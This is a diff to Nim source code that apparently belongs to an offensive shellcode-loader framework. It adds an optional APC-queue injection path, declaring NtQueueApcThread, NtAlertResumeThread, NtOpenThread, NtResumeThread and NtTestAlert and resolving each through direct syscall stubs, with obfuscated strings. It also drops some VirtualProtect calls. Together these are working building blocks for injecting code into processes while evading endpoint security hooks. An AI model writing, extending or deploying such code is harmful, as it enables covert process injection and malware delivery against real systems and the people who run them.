@@ -182,7 +182,21 @@ when defined(GetSyscallStub):
 
     var NtMapViewOfSection: proc(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.stdcall.}
 
+    when defined(QueueAPC):
+      type myNtQueueApcThread = proc(ThreadHandle: HANDLE, ApcRoutine: PKNORMAL_ROUTINE, ApcArgument1: PVOID, ApcArgument2: PVOID, ApcArgument3: PVOID): NTSTATUS {.stdcall.}
+      var NtQueueApcThread: proc(ThreadHandle: HANDLE, ApcRoutine: PKNORMAL_ROUTINE, ApcArgument1: PVOID, ApcArgument2: PVOID, ApcArgument3: PVOID): NTSTATUS {.stdcall.}
 
+      type myNtAlertResumeThread = proc(ThreadHandle: HANDLE, PreviousSuspendCount: PULONG): NTSTATUS {.stdcall.}
+      var NtAlertResumeThread: proc(ThreadHandle: HANDLE, PreviousSuspendCount: PULONG): NTSTATUS {.stdcall.}
+
+      type myNtOpenThread = proc(ThreadHandle: PHANDLE; DesiredAccess: ACCESS_MASK; ObjectAttributes: POBJECT_ATTRIBUTES; ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
+      var NtOpenThread: proc(ThreadHandle: PHANDLE; DesiredAccess: ACCESS_MASK; ObjectAttributes: POBJECT_ATTRIBUTES; ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
+      
+      type myNtResumeThread = proc(ThreadHandle: HANDLE; SuspendCount: PULONG): NTSTATUS {.stdcall.}
+      var NtResumeThread: proc(ThreadHandle: HANDLE; SuspendCount: PULONG): NTSTATUS {.stdcall.}
+
+      type myNtTestAlert = proc(): NTSTATUS {.stdcall.}
+      var NtTestAlert: proc(): NTSTATUS {.stdcall.}
     
     type
       CreateFileA_t* = proc (lpFileName: LPCSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.stdcall.}
@@ -343,10 +357,6 @@ let RetrieveSyscallStubs * = """
         var syscallStub_NtOpenP: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (6 * cast[HANDLE](SYSCALL_STUB_SIZE))
         # define NtOpenProcess
         var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
-        when defined(DInvoke):
-            discard MyVirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-        else:
-            VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
         
         syssuccess = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
         when defined(verbose):
@@ -357,6 +367,40 @@ let RetrieveSyscallStubs * = """
         syssuccess = GetSyscallStub(obf("NtCreateThreadEx"), cast[LPVOID](syscallStub_NtCreateThread))
         when defined(verbose):
             echo obf("[*] GetSyscallStub NtCreateThreadEx: ") & $syssuccess
+
+    when defined(QueueAPC):
+        var syscallStub_NtQueueApcThread: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (8 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        var syscallStub_NtAlertResumeThread: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (9 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        # define NtQueueApcThread
+        NtQueueApcThread = cast[myNtQueueApcThread](cast[LPVOID](syscallStub_NtQueueApcThread))
+        # define NtAlertResumeThread
+        NtAlertResumeThread = cast[myNtAlertResumeThread](cast[LPVOID](syscallStub_NtAlertResumeThread))
+
+        var syscallStub_NtTestAlert: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (10 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        # define NtTestAlert
+        NtTestAlert = cast[myNtTestAlert](cast[LPVOID](syscallStub_NtTestAlert))
+        
+        var syscallStub_NtOpenThread: HANDLE = cast[HANDLE](cast[LPVOID](syscallStub_NtProtect) + (11 * cast[HANDLE](SYSCALL_STUB_SIZE)))
+        # define NtOpenThread
+        NtOpenThread = cast[myNtOpenThread](cast[LPVOID](syscallStub_NtOpenThread))
+
+        var syscallStub_NtResumeThread: HANDLE = cast[HANDLE](cast[LPVOID](syscallStub_NtProtect) + (12 * cast[HANDLE](SYSCALL_STUB_SIZE)))
+        # define NtResumeThread
+        NtResumeThread = cast[myNtResumeThread](cast[LPVOID](syscallStub_NtResumeThread))
+
+
+        syssuccess = GetSyscallStub(obf("NtQueueApcThread"), cast[LPVOID](syscallStub_NtQueueApcThread))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub NtQueueApcThread: ") & $syssuccess
+        
+        syssuccess = GetSyscallStub(obf("NtAlertResumeThread"), cast[LPVOID](syscallStub_NtAlertResumeThread))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub NtAlertResumeThread: ") & $syssuccess
+          
+        syssuccess = GetSyscallStub(obf("NtTestAlert"), cast[LPVOID](syscallStub_NtTestAlert))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub NtTestAlert: ") & $syssuccess
+        
 
 
     
